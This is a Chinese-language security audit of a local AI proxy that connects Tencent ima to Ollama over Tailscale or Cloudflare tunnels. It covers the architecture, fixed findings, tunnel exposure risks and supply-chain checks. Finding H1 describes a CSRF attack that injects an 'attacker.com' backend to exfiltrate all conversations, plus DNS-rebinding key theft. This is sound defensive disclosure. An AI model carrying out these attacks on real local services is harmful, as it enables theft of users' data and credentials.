## 二、系统架构与数据流（威胁模型基础）

```
┌──────────┐ HTTPS  ┌─────────────────────┐        ┌──────────────────────┐
│ ima 腾讯后端 │ ────▶ │ 公网入口（二选一/双开）  │ ─────▶ │ 本机代理 :18081        │
│ (腾讯机房)  │       │ A. Tailscale Funnel  │        │ 鉴权→探测秒回→协议翻译  │
└──────────┘       │ B. cloudflared 快隧道  │        │ → Ollama / 远程后端    │
                   └─────────────────────┘        └──────────────────────┘
管理面：浏览器 ──▶ 本机管理UI/API :18080（仅 127.0.0.1）
```

信任边界：
1. **公网 → 代理**（唯一 Key 凭证，经隧道中继）
2. **浏览器 → 管理 API**（本机回环，本次高危所在）
3. **代理 → 模型后端**（本机 Ollama / 局域网-远程 OpenAI 兼容）

## 三、发现清单

### H1 🔴 管理 API 无浏览器来源防护（CSRF + DNS Rebinding）— 已修复

- **位置**：`hub.js handleUi()`（修复前）
- **根因**：所有 `/api/*` 端点①不校验 `Host`；②不校验 `Origin`/`Sec-Fetch-Site`；③`JSON.parse` 不看 `Content-Type`
- **攻击场景 A（CSRF 窃取全部对话）**：用户浏览任意恶意网页 → 网页用 `Content-Type: text/plain`（简单请求，无 CORS 预检）POST `http://127.0.0.1:18080/api/install`，注入 `backends:[{type:'openai', url:'http://attacker.com'}]` → 此后 ima 的**所有提问与知识库上下文被转发到攻击者服务器**
- **攻击场景 B（DNS Rebinding 偷 Key）**：恶意域名解析到 127.0.0.1 → 同源策略失效 → 直接读取 `/api/status` 拿到 `apiKey` 全文
- **攻击场景 C（DoS）**：CSRF 调 `/api/key/rotate` 反复换 Key 使 ima 持续断连
- **修复（四层）**：Host 白名单（`127.0.0.1/localhost/[::1]:18080`）；`Sec-Fetch-Site: cross-site` 或 Origin 不匹配 → 403；非 GET 强制 `Content-Type: application/json`（415）；install 后端白名单校验（见 M3）
- **验证**：恶意 Host→`403`；cross-site→`403`；text/plain POST→`415`；本机正常请求→`200`

### M1 🟡 Bearer 密钥非常数时间比较 — 已修复

- **位置**：`lib/proxy-core.js`（原 `auth === 'Bearer '+key`）
- **风险**：时序侧信道逐字节恢复 Key（公网+抖动下实操难度高，但属标准必修项）
- **修复**：`crypto.timingSafeEqual`，长度不等提前返回

### M2 🟡 鉴权失败无限流 — 已修复

- **位置**：`lib/proxy-core.js`
- **风险**：公网暴破/刷噪（Key 为 128bit 随机，暴破成功不可行，但可耗资源、刷日志）；注意隧道下来源 IP 恒为回环，**per-IP 限流无效**
- **修复**：全局滑动窗口——401 超 30 次/分钟 → `429 + retry-after`，事件入日志（可作为暴破告警源）

### M3 🟡 install API 后端注入无校验 — 已修复

- **位置**：`hub.js /api/install`
- **修复**：type 白名单 `{ollama, openai}`；ollama 强制 host=127.0.0.1/localhost；openai url 必须 `http(s)://`、path 白名单字符；后端名 `[A-Za-z0-9_.-]{1,64}`
- **验证**：`{"type":"ftp"}` → `400 {"details":["未知后端类型: ftp"]}`

## 四、专项：经 Cloudflare / Tailscale 的数据传输风险（用户重点关注）

### 4.1 事实矩阵

| | Tailscale Funnel（ts.net:8443） | cloudflared 快隧道（trycloudflare.com） |
|---|---|---|
| TLS 终结点 | **本机 tailscaled**（证书私钥在本机签发持有） | **Cloudflare 边缘**（*.trycloudflare.com 证书属 CF） |
| 对话内容/知识库 RAG 上下文 | 中继只见密文（SNI/流量元数据可见） | **Cloudflare 全文可见** |
| API Key（Authorization 头） | 端到端加密至本机 | **对 Cloudflare 可见** |
| 凭证与审计 | 绑定你的尾网账号 | 无账号、无审计、URL 即半个凭据 |
| 地址稳定性 | 永久不变 | 每次进程重启变化 |

### 4.2 不可消除项（如实告知）

1. **腾讯侧 RAG**：ima 的知识库检索/改写在腾讯服务器执行——你的提问与被检索片段**本来就会出网到腾讯**，这是 ima 产品架构决定的，与本项目无关
2. **应用层端到端加密不可行**：需要腾讯后端配合（自定义加密协议），其 OpenAI 兼容调用不支持
3. 因此**隧道方的暴露面差异只在于"TLS 在哪终结"**——本项目能做的是把可见面压到最小并给你选择权

### 4.3 应对方案（按优先级执行）

| # | 措施 | 成本 | 状态 |
|---|---|---|---|
| 1 | **默认/主力用 Tailscale Funnel**；CF 仅作 ts.net 不可达时的应急 | 0（已如此） | ✅ UI 已标注"推荐/备用" |
| 2 | CF 入口加显式警示文案：「内容对 Cloudflare 可见，仅临时应急」 | 小 | 📋 待做（改 UI 文案） |
| 3 | **双入口独立 Key**：CF 那把视为"已被 CF 过目"，泄露即轮换、互不影响 | 小 | 📋 待做（代理支持 per-entrance key） |
| 4 | 知识库分级：**绝密资料不挂此链路**（腾讯 RAG + 隧道方均可见） | 管理措施 | 建议立即执行 |
| 5 | 如必须长期走 CF：升级 **named tunnel + 自有域名**（获得账号级审计），放弃 quick tunnel | 中 | 可选 |
| 6 | 暴破监控：401 限流事件已在日志，后续可加 UI 异常提醒 | 小 | 📋 待做 |

## 五、供应链与其他检查

- **依赖**：零 npm 依赖，纯 Node 标准库——供应链面极小 ✅
- **Node 运行时**：内嵌 v22.14.0（LTS）锁定版本；建议发版前检查 Node LTS 补丁并更新 `installer/runtime-win` 与 CI 版本号
- **密钥入库**：复查 git 历史——`devdata/`、`bin/`、Key 均被 .gitignore 排除，无泄露 ✅
- **静态文件服务**：精确路径匹配（index.html/app.js/style.css/logo/favicon），无目录穿越 ✅
- **SSRF 面**：代理仅向"本地管理接口写入的后端"发起请求，且 H1+M3 修复后写入路径已锁死 ✅
- **隧道进程**：cloudflared URL 从自有进程 stdout 正则捕获（`[a-z0-9-]+` 域名），无注入面 ✅
- **macOS 侧**（beta）：launchd plist 写入用户目录、launcher 无提权；未真机验证运行时行为
